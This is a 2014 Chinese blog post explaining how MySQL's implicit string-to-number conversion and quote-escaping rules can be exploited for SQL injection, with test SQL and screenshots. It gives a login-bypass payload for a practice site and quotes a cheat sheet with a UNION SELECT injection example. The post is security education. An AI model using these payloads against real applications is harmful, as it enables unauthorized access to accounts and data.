<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> mysql的几个小特性在sql注入中的应用 · xd_xd's blog</title><meta name="description" content="mysql的几个小特性在sql注入中的应用 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/stayliv3" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">mysql的几个小特性在sql注入中的应用</h1><div class="post-info">Oct 31, 2014</div><div class="post-content"><p>mysql的几个小特性在sql注入中的应用</p>
<p>###参考资料</p>
<p><a href="https://websec.wordpress.com/2008/09/09/mysql-authentication-bypass/" target="_blank" rel="external">https://websec.wordpress.com/2008/09/09/mysql-authentication-bypass/</a></p>
<p><a href="http://bugs.mysql.com/bug.php?id=39337" target="_blank" rel="external">http://bugs.mysql.com/bug.php?id=39337</a></p>
<p><a href="http://www.exploit-db.com/papers/18263/" target="_blank" rel="external">http://www.exploit-db.com/papers/18263/</a></p>
<h3 id="mysql运算时的数据类型自动转换">mysql运算时的数据类型自动转换</h3><p>测试数据生成</p>
<pre><code><span class="operator"><span class="keyword">create</span> <span class="keyword">database</span> test_db;</span>
<span class="operator"><span class="keyword">use</span> test_db;</span>
<span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(<span class="keyword">num</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>, <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>, <span class="keyword">password</span> <span class="built_in">int</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>, primary <span class="keyword">key</span>(<span class="keyword">num</span>));</span>

<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'111111'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">2</span>, <span class="string">'222wh1ant'</span>, <span class="string">'222222'</span>);</span>
<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">3</span>, <span class="string">'secuholic'</span>, <span class="string">'333333'</span>);</span>
</code></pre><p>测试1：</p>
<pre><code><span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">0</span></span>
</code></pre><p>结果为 </p>
<p><img src="/images/mysqlfeature1.jpg" alt="mysql"></p>
<p>之所以会有这个结果，是因为id给出的条件是=0，0是一个int型的变量。所以mysql会把表中id一列的数据先转换成int型再跟0比较，’admin’和’secuholic’字符串转换成数字是0，’222wh1ant’转换成数字是222，这个规则是php中的类型转换差不多的。我们可以测试一下：</p>
<pre><code><span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">222</span></span>
</code></pre><p>结果果然跟预期一样。</p>
<p><img src="/images/mysqlfeature2.jpg" alt="mysql"></p>
<p>上面的例子是比较运算=的类型转换。其他的运算符也存在同样的类型转换问题。比如:</p>
<p>空字符串减去空字符串，运算结果是数字零。<br><img src="/images/mysqlfeature3.jpg" alt="mysql"></p>
<p>利用这个特性可以构造出一些比较有意思的利用方式。比如：<a href="http://www.sqlzoo.net/hack/" target="_blank" rel="external">http://www.sqlzoo.net/hack/</a></p>
<p>可以利用这样一个payload来绕过,用户名填</p>
<pre><code><span class="quoted">'-</span>
</code></pre><p>密码填</p>
<pre><code><span class="comment">'</span>
</code></pre><p>这样构造成的sql语句为</p>
<pre><code><span class="built_in">where</span> username = <span class="string">''</span>-<span class="string">' and password='</span><span class="string">''</span>
</code></pre><p>最终的运算相当于空字符串减去字符串” and password=’” 运算结果为0，最终的where条件为where<br>username = 0。</p>
<p>当然这个地方还有个小trick就是最后一个字符串’ and password=’’’这里怎么理解。在字符串中单引号是可以为单引号转义的，只要单引号是成对的就不不会报错。可以参考这里<a href="http://websec.ca/kb/sql_injection" target="_blank" rel="external">http://websec.ca/kb/sql_injection</a></p>
<pre><code>Given the query <span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'1'</span>;</span>

'    False
''    True
"    False
""    True
\    False
\\    True

Examples:
<span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Articles <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'1'''</span>;</span>
<span class="operator"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> dual <span class="keyword">WHERE</span> <span class="number">1</span> = <span class="string">'1'''''''''''''</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">'2'</span>;</span>
Notes:

You can <span class="operator"><span class="keyword">use</span> <span class="keyword">as</span> many apostrophes <span class="keyword">and</span> quotations <span class="keyword">as</span> you want <span class="keyword">as</span> <span class="keyword">long</span> <span class="keyword">as</span> they pair up.
It <span class="keyword">is</span> also possible <span class="keyword">to</span> continue the <span class="keyword">statement</span> <span class="keyword">after</span> the <span class="keyword">chain</span> <span class="keyword">of</span> quotes.
Quotes escape quotes.</span>
</code></pre></div></article></div></section><footer><div class="paginator"><a href="/2014/11/17/strcmp/" class="prev">上一篇</a><a href="/2014/10/29/ecshoplogin/" class="next">下一篇</a></div><div class="copyright"><p>© 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>